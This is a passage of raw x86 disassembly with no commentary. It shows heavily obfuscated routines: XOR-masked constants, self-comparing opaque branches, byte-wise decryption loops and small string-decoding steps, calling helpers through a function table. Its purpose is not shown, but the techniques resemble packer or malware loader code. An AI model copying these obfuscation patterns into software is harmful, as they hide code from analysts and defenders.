  42501e:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  425025:	mov    eax,DWORD PTR [ebp-0x38]
  425028:	mov    ecx,DWORD PTR [ebp-0x28]
  42502b:	xor    eax,ebx
  42502d:	add    eax,esi
  42502f:	cmp    ecx,eax
  425031:	je     0x425230
  425037:	jmp    0x42520c
  42503c:	mov    ecx,DWORD PTR [ebp-0xc]
  42503f:	mov    eax,DWORD PTR [ebp-0x28]
  425042:	sub    eax,ecx
  425044:	mov    ecx,DWORD PTR [ebp-0x48]
  425047:	xor    ecx,ebx
  425049:	add    ecx,esi
  42504b:	xor    edx,edx
  42504d:	div    ecx
  42504f:	mov    DWORD PTR [ebp-0x8],eax
  425052:	mov    eax,DWORD PTR [ebp-0x4c]
  425055:	mov    ecx,DWORD PTR [ebp-0x8]
  425058:	xor    eax,ebx
  42505a:	add    eax,esi
  42505c:	cmp    ecx,eax
  42505e:	jbe    0x42506a
  425060:	mov    eax,DWORD PTR [ebp-0x4c]
  425063:	xor    eax,ebx
  425065:	add    eax,esi
  425067:	mov    DWORD PTR [ebp-0x8],eax
  42506a:	mov    eax,DWORD PTR [ebp-0x48]
  42506d:	mov    ecx,DWORD PTR [ebp-0x8]
  425070:	xor    eax,ebx
  425072:	add    eax,esi
  425074:	imul   eax,ecx
  425077:	mov    DWORD PTR [ebp-0x8],eax
  42507a:	mov    eax,DWORD PTR [ebp-0x38]
  42507d:	mov    ecx,DWORD PTR [ebp-0x8]
  425080:	xor    eax,ebx
  425082:	add    eax,esi
  425084:	cmp    ecx,eax
  425086:	je     0x4251fa
  42508c:	mov    eax,DWORD PTR [ebp-0x8]
  42508f:	mov    DWORD PTR [ebp-0x14],eax
  425092:	mov    eax,DWORD PTR [ebp-0xc]
  425095:	add    eax,DWORD PTR [ebp-0xd4]
  42509b:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  4250a2:	mov    DWORD PTR [ebp-0x34],edi
  4250a5:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  4250af:	mov    DWORD PTR [ebp-0x8],eax
  4250b2:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4250b9:	mov    DWORD PTR [ebp-0x1c],edi
  4250bc:	mov    eax,DWORD PTR [ebp-0x20]
  4250bf:	xor    eax,ebx
  4250c1:	add    eax,esi
  4250c3:	jmp    0x4251b9
  4250c8:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  4250d2:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  4250dc:	mov    eax,DWORD PTR [ebp-0x1c]
  4250df:	mov    ecx,DWORD PTR [ebp-0x44]
  4250e2:	xor    eax,ebx
  4250e4:	add    eax,esi
  4250e6:	imul   eax,ecx
  4250e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4250ec:	mov    al,BYTE PTR [eax+ecx*1]
  4250ef:	mov    BYTE PTR [ebp-0x2],al
  4250f2:	mov    eax,DWORD PTR [ebp-0x1c]
  4250f5:	mov    ecx,DWORD PTR [ebp-0x44]
  4250f8:	xor    eax,ebx
  4250fa:	add    eax,esi
  4250fc:	imul   eax,ecx
  4250ff:	mov    ecx,DWORD PTR [ebp-0xe8]
  425105:	xor    ecx,ebx
  425107:	add    eax,ecx
  425109:	mov    ecx,DWORD PTR [ebp-0x8]
  42510c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425114:	mov    ecx,DWORD PTR [ebp-0xe0]
  42511a:	xor    ecx,ebx
  42511c:	lea    eax,[ecx+eax*1+0x3272f8]
  425123:	movzx  ecx,BYTE PTR [ebp-0x2]
  425127:	xor    ecx,eax
  425129:	mov    BYTE PTR [ebp-0x2],cl
  42512c:	mov    al,BYTE PTR [ebp-0x2]
  42512f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425132:	mov    edx,DWORD PTR [ebp-0x44]
  425135:	xor    ecx,ebx
  425137:	add    ecx,esi
  425139:	imul   ecx,edx
  42513c:	mov    edx,DWORD PTR [ebp-0x8]
  42513f:	mov    BYTE PTR [ecx+edx*1],al
  425142:	mov    eax,DWORD PTR [ebp-0x1c]
  425145:	mov    ecx,DWORD PTR [ebp-0x44]
  425148:	xor    eax,ebx
  42514a:	add    eax,esi
  42514c:	imul   eax,ecx
  42514f:	mov    ecx,DWORD PTR [ebp-0x8]
  425152:	mov    al,BYTE PTR [eax+ecx*1]
  425155:	mov    BYTE PTR [ebp-0x2],al
  425158:	mov    eax,DWORD PTR [ebp-0x1c]
  42515b:	mov    ecx,DWORD PTR [ebp-0x44]
  42515e:	xor    eax,ebx
  425160:	add    eax,esi
  425162:	imul   eax,ecx
  425165:	mov    ecx,DWORD PTR [ebp-0x34]
  425168:	xor    ecx,ebx
  42516a:	add    eax,ecx
  42516c:	mov    ecx,DWORD PTR [ebp-0x8]
  42516f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425177:	mov    ecx,DWORD PTR [ebp-0xc4]
  42517d:	xor    ecx,ebx
  42517f:	lea    eax,[ecx+eax*1+0x3272f8]
  425186:	movzx  ecx,BYTE PTR [ebp-0x2]
  42518a:	xor    ecx,eax
  42518c:	mov    BYTE PTR [ebp-0x2],cl
  42518f:	mov    al,BYTE PTR [ebp-0x2]
  425192:	mov    ecx,DWORD PTR [ebp-0x1c]
  425195:	mov    edx,DWORD PTR [ebp-0x44]
  425198:	xor    ecx,ebx
  42519a:	add    ecx,esi
  42519c:	imul   ecx,edx
  42519f:	mov    edx,DWORD PTR [ebp-0x8]
  4251a2:	mov    BYTE PTR [ecx+edx*1],al
  4251a5:	mov    eax,DWORD PTR [ebp-0x30]
  4251a8:	mov    ecx,DWORD PTR [ebp-0x34]
  4251ab:	xor    eax,ebx
  4251ad:	xor    ecx,ebx
  4251af:	add    eax,esi
  4251b1:	add    ecx,esi
  4251b3:	imul   eax,ecx
  4251b6:	add    eax,DWORD PTR [ebp-0x44]
  4251b9:	mov    DWORD PTR [ebp-0x44],eax
  4251bc:	mov    eax,DWORD PTR [ebp-0x44]
  4251bf:	mov    ecx,DWORD PTR [ebp-0x14]
  4251c2:	cmp    ecx,eax
  4251c4:	jb     0x4250c8
  4251ca:	mov    eax,DWORD PTR [ebp-0x34]
  4251cd:	mov    ecx,DWORD PTR [ebp-0x14]
  4251d0:	xor    eax,ebx
  4251d2:	add    eax,esi
  4251d4:	imul   eax,ecx
  4251d7:	mov    ecx,DWORD PTR [ebp-0x20]
  4251da:	xor    ecx,ebx
  4251dc:	add    ecx,esi
  4251de:	or     eax,ecx
  4251e0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251e3:	xor    ecx,ebx
  4251e5:	add    eax,ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251ea:	xor    ecx,ebx
  4251ec:	add    eax,ecx
  4251ee:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f1:	lea    eax,[eax+ecx*1+0x64e5f0]
  4251f8:	jmp    0x425209
  4251fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4251fd:	mov    ecx,DWORD PTR [ebp-0xc]
  425200:	xor    eax,ebx
  425202:	lea    eax,[eax+ecx*1+0x3272f8]
  425209:	mov    DWORD PTR [ebp-0xc],eax
  42520c:	mov    eax,DWORD PTR [ebp-0x2c]
  42520f:	xor    eax,ebx
  425211:	mov    ecx,0xffcd8d08
  425216:	sub    ecx,eax
  425218:	add    ecx,DWORD PTR [ebp-0x28]
  42521b:	mov    eax,DWORD PTR [ebp-0x2c]
  42521e:	mov    edx,DWORD PTR [ebp-0xc]
  425221:	xor    eax,ebx
  425223:	add    eax,esi
  425225:	imul   eax,edx
  425228:	cmp    eax,ecx
  42522a:	jbe    0x42503c
  425230:	mov    eax,DWORD PTR [ebp-0x10]
  425233:	mov    ecx,DWORD PTR [ebp-0x40]
  425236:	mov    eax,DWORD PTR [ebp+0x8]
  425239:	mov    edx,DWORD PTR [ebp-0x54]
  42523c:	mov    eax,DWORD PTR [eax+0x1e0]
  425242:	xor    edx,ebx
  425244:	add    edx,esi
  425246:	push   edx
  425247:	mov    edx,DWORD PTR [ebp-0x3c]
  42524a:	xor    edx,ebx
  42524c:	add    edx,esi
  42524e:	push   edx
  42524f:	push   ecx
  425250:	mov    DWORD PTR [ebp-0x30],ecx
  425253:	mov    ecx,DWORD PTR [ebp-0x10]
  425256:	xor    ecx,ebx
  425258:	add    ecx,esi
  42525a:	push   ecx
  42525b:	call   DWORD PTR [eax+0x14]
  42525e:	mov    edi,eax
  425260:	mov    eax,DWORD PTR [ebp-0x10]
  425263:	xor    eax,ebx
  425265:	add    eax,esi
  425267:	cmp    eax,edi
  425269:	je     0x4252c4
  42526b:	mov    eax,DWORD PTR [ebp-0x10]
  42526e:	jmp    0x425291
  425270:	mov    ecx,DWORD PTR [ebp-0x24]
  425273:	xor    eax,ebx
  425275:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f8]
  42527c:	mov    BYTE PTR [eax+edi*1+0x3272f8],cl
  425283:	mov    ecx,DWORD PTR [ebp-0x18]
  425286:	xor    ecx,ebx
  425288:	lea    eax,[ecx+eax*1+0x3272f8]
  42528f:	xor    eax,ebx
  425291:	mov    ecx,DWORD PTR [ebp-0x40]
  425294:	sub    ecx,esi
  425296:	xor    ecx,ebx
  425298:	cmp    eax,ecx
  42529a:	jne    0x425270
  42529c:	mov    eax,DWORD PTR [ebp+0x8]
  42529f:	mov    ecx,DWORD PTR [ebp-0x50]
  4252a2:	mov    eax,DWORD PTR [eax+0x1e0]
  4252a8:	xor    ecx,ebx
  4252aa:	add    ecx,esi
  4252ac:	push   ecx
  4252ad:	mov    ecx,DWORD PTR [ebp-0x10]
  4252b0:	xor    ecx,ebx
  4252b2:	add    ecx,esi
  4252b4:	push   ecx
  4252b5:	push   DWORD PTR [ebp-0x24]
  4252b8:	call   DWORD PTR [eax+0x18]
  4252bb:	mov    eax,DWORD PTR [ebp-0x30]
  4252be:	mov    DWORD PTR [ebp-0x24],edi
  4252c1:	mov    DWORD PTR [ebp-0x40],eax
  4252c4:	mov    edi,DWORD PTR [ebp-0x24]
  4252c7:	mov    eax,DWORD PTR [ebp-0x18]
  4252ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4252cd:	xor    eax,ebx
  4252cf:	mov    DWORD PTR [ebp-0x30],edi
  4252d2:	add    eax,esi
  4252d4:	mov    DWORD PTR [ebp-0x5c],0xbcd3cbd3
  4252db:	mov    DWORD PTR [ebp-0x58],0xc6d3bed3
  4252e2:	jmp    0x425316
  4252e4:	xor    ecx,ebx
  4252e6:	mov    dl,BYTE PTR [ebp+ecx*1+0x32729c]
  4252ed:	xor    dl,0x80
  4252f0:	add    dl,0x5
  4252f3:	mov    DWORD PTR [ebp-0x3c],ecx
  4252f6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f8]
  4252fe:	movzx  edx,dl
  425301:	cmp    ecx,edx
  425303:	jne    0x425320
  425305:	mov    ecx,DWORD PTR [ebp-0x18]
  425308:	mov    edx,DWORD PTR [ebp-0x3c]
  42530b:	xor    ecx,ebx
  42530d:	lea    ecx,[ecx+edx*1+0x3272f8]
  425314:	xor    ecx,ebx
  425316:	cmp    ecx,0xf89c85a1
  42531c:	jne    0x4252e4
  42531e:	jmp    0x425327
  425320:	mov    eax,DWORD PTR [ebp-0x10]
  425323:	xor    eax,ebx
  425325:	add    eax,esi
  425327:	mov    ecx,DWORD PTR [ebp-0x10]
  42532a:	xor    ecx,ebx
  42532c:	add    ecx,esi
  42532e:	cmp    ecx,eax
  425330:	je     0x4254a3
  425336:	mov    eax,DWORD PTR [edi+0x8]
  425339:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  425340:	mov    DWORD PTR [ebp-0x3c],0xf89cc3c6
  425347:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  42534e:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  425355:	mov    DWORD PTR [ebp-0x14],eax
  425358:	mov    eax,DWORD PTR [ebp+0x8]
  42535b:	mov    ecx,DWORD PTR [ebp-0x20]
  42535e:	xor    ecx,ebx
  425360:	add    ecx,esi
  425362:	push   ecx
  425363:	mov    ecx,DWORD PTR [ebp-0x48]
  425366:	mov    eax,DWORD PTR [eax+0x1e0]
  42536c:	xor    ecx,ebx
  42536e:	add    ecx,esi
  425370:	push   ecx
  425371:	mov    ecx,DWORD PTR [ebp-0x3c]
  425374:	xor    ecx,ebx
  425376:	add    ecx,esi
  425378:	push   ecx
  425379:	mov    ecx,DWORD PTR [ebp-0xc]
  42537c:	xor    ecx,ebx
  42537e:	add    ecx,esi
  425380:	push   ecx
  425381:	call   DWORD PTR [eax+0x14]
  425384:	mov    edi,eax
  425386:	mov    eax,DWORD PTR [ebp+0x8]
  425389:	mov    ecx,DWORD PTR [ebp-0x20]
  42538c:	mov    eax,DWORD PTR [eax+0x1e0]
  425392:	xor    ecx,ebx
  425394:	add    ecx,esi
  425396:	push   ecx
  425397:	mov    ecx,DWORD PTR [ebp-0x48]
  42539a:	xor    ecx,ebx
  42539c:	add    ecx,esi
  42539e:	push   ecx
  42539f:	mov    ecx,DWORD PTR [ebp-0xc]
  4253a2:	push   DWORD PTR [ebp-0x14]
  4253a5:	xor    ecx,ebx
  4253a7:	add    ecx,esi
  4253a9:	push   ecx
  4253aa:	call   DWORD PTR [eax+0x14]
  4253ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4253b0:	xor    ecx,ebx
  4253b2:	add    ecx,esi
  4253b4:	mov    DWORD PTR [ebp-0x20],eax
  4253b7:	cmp    ecx,edi
  4253b9:	je     0x425746
  4253bf:	mov    ecx,DWORD PTR [ebp-0xc]
  4253c2:	xor    ecx,ebx
  4253c4:	add    ecx,esi
  4253c6:	cmp    ecx,eax
  4253c8:	je     0x425746
  4253ce:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  4253d5:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4253dc:	mov    ecx,DWORD PTR [ebp-0x3c]
  4253df:	xor    cl,0xb1
  4253e2:	sub    cl,0x8
  4253e5:	mov    BYTE PTR [edi],cl
  4253e7:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ea:	xor    cl,0xb1
  4253ed:	sub    cl,0x8
  4253f0:	mov    BYTE PTR [edi+0x1],cl
  4253f3:	mov    ecx,DWORD PTR [ebp-0x54]
  4253f6:	xor    cl,0xb1
  4253f9:	sub    cl,0x8
  4253fc:	mov    BYTE PTR [edi+0x2],cl
  4253ff:	and    DWORD PTR [ebp-0xc8],0x0
  425406:	and    DWORD PTR [ebp-0xdc],0x0
  42540d:	lea    ecx,[ebp-0xdc]
  425413:	push   ecx
  425414:	push   DWORD PTR [ebp-0x14]
  425417:	push   eax
  425418:	lea    eax,[ebp-0xc8]
  42541e:	push   eax
  42541f:	mov    eax,DWORD PTR [ebp-0x30]
  425422:	push   DWORD PTR [eax+0xc]
  425425:	mov    eax,DWORD PTR [ebp-0x24]
  425428:	add    eax,0x10
  42542b:	push   eax
  42542c:	push   edi
  42542d:	call   0x4246d3
  425432:	mov    DWORD PTR [ebp-0x3c],eax
  425435:	mov    eax,DWORD PTR [ebp+0x8]
  425438:	mov    ecx,DWORD PTR [ebp-0x50]
  42543b:	mov    eax,DWORD PTR [eax+0x1e0]
  425441:	xor    ecx,ebx
  425443:	add    ecx,esi
  425445:	push   ecx
  425446:	mov    ecx,DWORD PTR [ebp-0xc]
  425449:	xor    ecx,ebx
  42544b:	add    ecx,esi
  42544d:	push   ecx
  42544e:	push   edi
  42544f:	call   DWORD PTR [eax+0x18]
  425452:	mov    eax,DWORD PTR [ebp-0x3c]
  425455:	add    eax,0xffcd8d08
  42545a:	xor    eax,ebx
  42545c:	cmp    eax,0xf89c85b9
  425461:	mov    eax,DWORD PTR [ebp+0x8]
  425464:	mov    eax,DWORD PTR [eax+0x1e0]
  42546a:	mov    ecx,DWORD PTR [ebp-0x50]
  42546d:	jne    0x425490
  42546f:	xor    ecx,ebx
  425471:	add    ecx,esi
  425473:	push   ecx
  425474:	mov    ecx,DWORD PTR [ebp-0xc]
  425477:	xor    ecx,ebx
  425479:	add    ecx,esi
  42547b:	push   ecx
  42547c:	push   DWORD PTR [ebp-0x24]
  42547f:	call   DWORD PTR [eax+0x18]
  425482:	mov    eax,DWORD PTR [ebp-0x20]
  425485:	mov    DWORD PTR [ebp-0x24],eax
  425488:	mov    eax,DWORD PTR [ebp-0x14]
  42548b:	mov    DWORD PTR [ebp-0x40],eax
  42548e:	jmp    0x4254a3
  425490:	xor    ecx,ebx
  425492:	add    ecx,esi
  425494:	push   ecx
  425495:	mov    ecx,DWORD PTR [ebp-0xc]
  425498:	xor    ecx,ebx
  42549a:	add    ecx,esi
  42549c:	push   ecx
  42549d:	push   DWORD PTR [ebp-0x20]
  4254a0:	call   DWORD PTR [eax+0x18]
  4254a3:	mov    eax,DWORD PTR [ebp-0x40]
  4254a6:	mov    DWORD PTR [ebp-0x38],eax
  4254a9:	mov    eax,DWORD PTR [ebp-0x24]
  4254ac:	mov    DWORD PTR [ebp-0x28],0xf89c85b9
  4254b3:	mov    DWORD PTR [ebp-0x3c],eax
  4254b6:	mov    edi,0xf89c85b8
  4254bb:	mov    DWORD PTR [ebp-0x2c],edi
  4254be:	mov    eax,DWORD PTR [ebp-0x28]
  4254c1:	xor    eax,ebx
  4254c3:	add    eax,esi
  4254c5:	mov    DWORD PTR [ebp-0xc],eax
  4254c8:	mov    eax,DWORD PTR [ebp-0x28]
  4254cb:	xor    eax,ebx
  4254cd:	add    eax,esi
  4254cf:	mov    DWORD PTR [ebp-0x14],eax
  4254d2:	mov    DWORD PTR [ebp-0x48],0xf89c8599
  4254d9:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  4254e0:	mov    eax,DWORD PTR [ebp-0x28]
  4254e3:	mov    ecx,DWORD PTR [ebp-0x38]
  4254e6:	xor    eax,ebx
  4254e8:	add    eax,esi
  4254ea:	cmp    ecx,eax
  4254ec:	je     0x4256e2
  4254f2:	jmp    0x4256be
  4254f7:	mov    ecx,DWORD PTR [ebp-0xc]
  4254fa:	mov    eax,DWORD PTR [ebp-0x38]
  4254fd:	sub    eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x48]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	xor    edx,edx
  425508:	div    ecx
  42550a:	mov    DWORD PTR [ebp-0x14],eax
  42550d:	mov    eax,DWORD PTR [ebp-0x20]
  425510:	mov    ecx,DWORD PTR [ebp-0x14]
  425513:	xor    eax,ebx
  425515:	add    eax,esi
  425517:	cmp    ecx,eax
  425519:	jbe    0x425525
  42551b:	mov    eax,DWORD PTR [ebp-0x20]
  42551e:	xor    eax,ebx
  425520:	add    eax,esi
  425522:	mov    DWORD PTR [ebp-0x14],eax
  425525:	mov    eax,DWORD PTR [ebp-0x48]
  425528:	mov    ecx,DWORD PTR [ebp-0x14]
  42552b:	xor    eax,ebx
  42552d:	add    eax,esi
  42552f:	imul   eax,ecx
  425532:	mov    DWORD PTR [ebp-0x14],eax
  425535:	mov    eax,DWORD PTR [ebp-0x28]
  425538:	mov    ecx,DWORD PTR [ebp-0x14]
  42553b:	xor    eax,ebx
  42553d:	add    eax,esi
  42553f:	cmp    ecx,eax
  425541:	je     0x4256ac
  425547:	mov    eax,DWORD PTR [ebp-0x14]
  42554a:	mov    DWORD PTR [ebp-0x34],eax
  42554d:	mov    eax,DWORD PTR [ebp-0xc]
  425550:	add    eax,DWORD PTR [ebp-0x3c]
  425553:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  42555a:	mov    DWORD PTR [ebp-0x14],edi
  42555d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  425564:	mov    DWORD PTR [ebp-0x1c],eax
  425567:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  42556e:	mov    DWORD PTR [ebp-0x8],edi
  425571:	mov    eax,DWORD PTR [ebp-0x4c]
  425574:	xor    eax,ebx
  425576:	add    eax,esi
  425578:	jmp    0x42566b
  42557d:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  425587:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  425591:	mov    eax,DWORD PTR [ebp-0x8]
  425594:	mov    ecx,DWORD PTR [ebp-0x18]
  425597:	xor    eax,ebx
  425599:	add    eax,esi
  42559b:	imul   eax,ecx
  42559e:	mov    ecx,DWORD PTR [ebp-0x1c]
  4255a1:	mov    al,BYTE PTR [eax+ecx*1]
  4255a4:	mov    BYTE PTR [ebp-0x1],al
  4255a7:	mov    eax,DWORD PTR [ebp-0x8]
  4255aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4255ad:	xor    eax,ebx
  4255af:	add    eax,esi
  4255b1:	imul   eax,ecx
  4255b4:	mov    ecx,DWORD PTR [ebp-0x54]
  4255b7:	xor    ecx,ebx
  4255b9:	add    eax,ecx
  4255bb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4255be:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  4255c6:	mov    ecx,DWORD PTR [ebp-0xe4]
  4255cc:	xor    ecx,ebx
  4255ce:	lea    eax,[ecx+eax*1+0x3272f8]
  4255d5:	movzx  ecx,BYTE PTR [ebp-0x1]
  4255d9:	xor    ecx,eax
  4255db:	mov    BYTE PTR [ebp-0x1],cl
  4255de:	mov    al,BYTE PTR [ebp-0x1]
  4255e1:	mov    ecx,DWORD PTR [ebp-0x8]
  4255e4:	mov    edx,DWORD PTR [ebp-0x18]
  4255e7:	xor    ecx,ebx
  4255e9:	add    ecx,esi
  4255eb:	imul   ecx,edx
  4255ee:	mov    edx,DWORD PTR [ebp-0x1c]
  4255f1:	mov    BYTE PTR [ecx+edx*1],al
  4255f4:	mov    eax,DWORD PTR [ebp-0x8]
  4255f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4255fa:	xor    eax,ebx
  4255fc:	add    eax,esi
  4255fe:	imul   eax,ecx
  425601:	mov    ecx,DWORD PTR [ebp-0x1c]
  425604:	mov    al,BYTE PTR [eax+ecx*1]
  425607:	mov    BYTE PTR [ebp-0x1],al
  42560a:	mov    eax,DWORD PTR [ebp-0x8]
  42560d:	mov    ecx,DWORD PTR [ebp-0x18]
  425610:	xor    eax,ebx
  425612:	add    eax,esi
  425614:	imul   eax,ecx
  425617:	mov    ecx,DWORD PTR [ebp-0x14]
  42561a:	xor    ecx,ebx
  42561c:	add    eax,ecx
  42561e:	mov    ecx,DWORD PTR [ebp-0x1c]
  425621:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425629:	mov    ecx,DWORD PTR [ebp-0xd0]
  42562f:	xor    ecx,ebx
  425631:	lea    eax,[ecx+eax*1+0x3272f8]
  425638:	movzx  ecx,BYTE PTR [ebp-0x1]
  42563c:	xor    ecx,eax
  42563e:	mov    BYTE PTR [ebp-0x1],cl
  425641:	mov    al,BYTE PTR [ebp-0x1]
  425644:	mov    ecx,DWORD PTR [ebp-0x8]
  425647:	mov    edx,DWORD PTR [ebp-0x18]
  42564a:	xor    ecx,ebx
  42564c:	add    ecx,esi
  42564e:	imul   ecx,edx
  425651:	mov    edx,DWORD PTR [ebp-0x1c]
  425654:	mov    BYTE PTR [ecx+edx*1],al
  425657:	mov    eax,DWORD PTR [ebp-0x30]
  42565a:	mov    ecx,DWORD PTR [ebp-0x14]
  42565d:	xor    eax,ebx
  42565f:	xor    ecx,ebx
  425661:	add    eax,esi
  425663:	add    ecx,esi
  425665:	imul   eax,ecx
  425668:	add    eax,DWORD PTR [ebp-0x18]
  42566b:	mov    DWORD PTR [ebp-0x18],eax
  42566e:	mov    eax,DWORD PTR [ebp-0x18]
  425671:	mov    ecx,DWORD PTR [ebp-0x34]
  425674:	cmp    ecx,eax
  425676:	jb     0x42557d
  42567c:	mov    eax,DWORD PTR [ebp-0x14]
  42567f:	mov    ecx,DWORD PTR [ebp-0x34]
  425682:	xor    eax,ebx
  425684:	add    eax,esi
  425686:	imul   eax,ecx
  425689:	mov    ecx,DWORD PTR [ebp-0x4c]
  42568c:	xor    ecx,ebx
  42568e:	add    ecx,esi
  425690:	or     eax,ecx
  425692:	mov    ecx,DWORD PTR [ebp-0x2c]
  425695:	xor    ecx,ebx
  425697:	add    eax,ecx
  425699:	mov    ecx,DWORD PTR [ebp-0x2c]
  42569c:	xor    ecx,ebx
  42569e:	add    eax,ecx
  4256a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4256a3:	lea    eax,[eax+ecx*1+0x64e5f0]
  4256aa:	jmp    0x4256bb
  4256ac:	mov    eax,DWORD PTR [ebp-0x2c]
  4256af:	mov    ecx,DWORD PTR [ebp-0xc]
  4256b2:	xor    eax,ebx
  4256b4:	lea    eax,[eax+ecx*1+0x3272f8]
  4256bb:	mov    DWORD PTR [ebp-0xc],eax
  4256be:	mov    eax,DWORD PTR [ebp-0x2c]
  4256c1:	xor    eax,ebx
  4256c3:	mov    ecx,0xffcd8d08
  4256c8:	sub    ecx,eax
  4256ca:	add    ecx,DWORD PTR [ebp-0x38]
  4256cd:	mov    eax,DWORD PTR [ebp-0x2c]
  4256d0:	mov    edx,DWORD PTR [ebp-0xc]
  4256d3:	xor    eax,ebx
  4256d5:	add    eax,esi
  4256d7:	imul   eax,edx
  4256da:	cmp    eax,ecx
  4256dc:	jbe    0x4254f7
  4256e2:	push   DWORD PTR [ebp+0x8]
  4256e5:	mov    eax,DWORD PTR [ebp+0x8]
  4256e8:	push   DWORD PTR [eax+0x1cc]
  4256ee:	lea    eax,[ebp-0xd8]
  4256f4:	push   eax
  4256f5:	mov    eax,DWORD PTR [ebp+0x8]
  4256f8:	mov    eax,DWORD PTR [eax+0x1c4]
  4256fe:	push   DWORD PTR [eax]
  425700:	mov    eax,DWORD PTR [ebp+0x8]
  425703:	mov    eax,DWORD PTR [eax+0x1c0]
  425709:	push   DWORD PTR [eax]
  42570b:	push   DWORD PTR [ebp-0x40]
  42570e:	push   DWORD PTR [ebp-0x24]
  425711:	call   0x4261a8
  425716:	mov    DWORD PTR [ebp-0x3c],eax
  425719:	mov    eax,DWORD PTR [ebp-0x10]
  42571c:	mov    ecx,DWORD PTR [ebp-0x24]
  42571f:	xor    eax,ebx
  425721:	add    eax,esi
  425723:	cmp    eax,ecx
  425725:	je     0x425746
  425727:	mov    eax,DWORD PTR [ebp+0x8]
  42572a:	mov    ecx,DWORD PTR [ebp-0x50]
  42572d:	mov    eax,DWORD PTR [eax+0x1e0]
  425733:	xor    ecx,ebx
  425735:	add    ecx,esi
  425737:	push   ecx
  425738:	mov    ecx,DWORD PTR [ebp-0x10]
  42573b:	xor    ecx,ebx
  42573d:	add    ecx,esi
  42573f:	push   ecx
  425740:	push   DWORD PTR [ebp-0x24]
  425743:	call   DWORD PTR [eax+0x18]
  425746:	pop    edi
  425747:	pop    esi
  425748:	pop    ebx
  425749:	leave  
  42574a:	ret    0x4
  42574d:	push   ebp
  42574e:	mov    ebp,esp
  425750:	push   ecx
  425751:	push   ecx
  425752:	lea    eax,[ebp-0x8]
  425755:	mov    DWORD PTR [ebp-0x4],eax
  425758:	push   esi
  425759:	mov    esi,DWORD PTR [ebp-0x4]
  42575c:	mov    eax,0xf881bacf
  425761:	mov    DWORD PTR [esi],eax
  425763:	mov    esi,DWORD PTR [ebp-0x8]
  425766:	cmp    esi,eax
  425768:	pop    esi
  425769:	jne    0x425773
  42576b:	mov    BYTE PTR [ecx+0xa],0x7b
  42576f:	mov    BYTE PTR [edx+0x8],0xce
  425773:	mov    BYTE PTR [edx+0xa],0x7b
  425777:	mov    BYTE PTR [ecx+0x2],0xe9
  42577b:	leave  
  42577c:	ret    
  42577d:	push   ebp
  42577e:	mov    ebp,esp
  425780:	push   ecx
  425781:	push   ecx
  425782:	lea    eax,[ebp-0x8]
  425785:	mov    DWORD PTR [ebp-0x4],eax
  425788:	mov    edx,DWORD PTR [ebp-0x4]
  42578b:	mov    eax,0xf88b0bd3
  425790:	mov    DWORD PTR [edx],eax
  425792:	mov    edx,DWORD PTR [ebp-0x8]
  425795:	cmp    edx,eax
  425797:	jne    0x4257a8
  425799:	mov    eax,DWORD PTR [ebp+0x8]
  42579c:	mov    BYTE PTR [ecx+0x9],0xef
  4257a0:	mov    BYTE PTR [eax+0x7],0xa6
  4257a4:	mov    BYTE PTR [ecx+0x6],0xee
  4257a8:	mov    BYTE PTR [ecx+0x3],0xdf
  4257ac:	leave  
  4257ad:	ret    0x4
  4257b0:	push   ebp
  4257b1:	mov    ebp,esp
  4257b3:	push   ecx
  4257b4:	push   ecx
  4257b5:	lea    eax,[ebp-0x8]
  4257b8:	mov    DWORD PTR [ebp-0x4],eax
  4257bb:	mov    edx,DWORD PTR [ebp-0x4]
  4257be:	mov    eax,0x7e0dacf
  4257c3:	mov    DWORD PTR [edx],eax
  4257c5:	mov    edx,DWORD PTR [ebp-0x8]
  4257c8:	cmp    edx,eax
  4257ca:	jne    0x4257d0
  4257cc:	mov    BYTE PTR [ecx+0x7],0xa6
  4257d0:	mov    eax,DWORD PTR [ebp+0x8]
  4257d3:	mov    BYTE PTR [ecx+0x1],0xe4
  4257d7:	mov    BYTE PTR [eax+0x9],0xcf
  4257db:	leave  
  4257dc:	ret    0x4
  4257df:	push   ebp
  4257e0:	mov    ebp,esp
  4257e2:	push   ecx
  4257e3:	push   ecx
  4257e4:	lea    eax,[ebp-0x8]
  4257e7:	mov    DWORD PTR [ebp-0x4],eax
  4257ea:	push   esi
  4257eb:	mov    esi,DWORD PTR [ebp-0x4]
  4257ee:	mov    eax,0x7060e3e
  4257f3:	mov    DWORD PTR [esi],eax
  4257f5:	mov    esi,DWORD PTR [ebp-0x8]
  4257f8:	cmp    esi,eax
  4257fa:	pop    esi
